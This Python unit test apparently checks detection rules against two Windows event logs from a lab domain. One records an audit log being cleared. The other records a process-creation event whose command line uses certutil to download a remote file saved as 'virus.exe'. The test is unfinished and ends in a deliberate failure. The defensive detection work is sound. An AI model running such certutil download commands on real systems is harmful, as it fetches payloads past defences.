import unittest

from internal.logtest import LogtestStatus, send_multiple_logs  # type: ignore


class TestTa0005DefenseEvasionT1140DeobfuscateDecodeFilesOrInformation(unittest.TestCase):

    def test_id4688_certutil_download(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Eventlog", "providerGuid": "{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}", "eventID": "1102", "version": "0", "level": "4", "task": "104", "opcode": "0", "keywords": "0x4020000000000000", "systemTime": "2021-11-02T14:15:23.6767023Z", "eventRecordID": "706649", "processID": "692", "threadID": "4016", "channel": "Security", "computer": "fs03vuln.offsec.lan", "severityValue": "INFORMATION", "message": "The audit log was cleared.\nSubject:\n\tSecurity ID:\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\tadmmig\n\tDomain Name:\tOFFSEC\n\tLogon ID:\t0x5BA37"}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "1", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-11-02T14:15:24.5673276Z", "eventRecordID": "706650", "processID": "4", "threadID": "3648", "channel": "Security", "computer": "fs03vuln.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x5BA37\n\nProcess Information:\n\tNew Process ID:\t\t0xedc\n\tNew Process Name:\tC:\\Windows\\System32\\certutil.exe\n\tToken Elevation Type:\tTokenElevationTypeFull (2)\n\tCreator Process ID:\t0x370\n\tProcess Command Line:\tcertutil  -urlcache -split -f https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/blob/master/EVTX_full_APT_attack_steps/ID4688,4698,4699,5145,4624-ATexec%20remote%20trask%20creation%20(GLOBAL).evtx virus.exe\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x5ba37", "newProcessId": "0xedc", "newProcessName": "C:\\Windows\\System32\\certutil.exe", "tokenElevationType": "%%1937", "processId": "0x370", "commandLine": "certutil  -urlcache -split -f https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/blob/master/EVTX_full_APT_attack_steps/ID4688,4698,4699,5145,4624-ATexec%20remote%20trask%20creation%20(GLOBAL).evtx virus.exe"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")
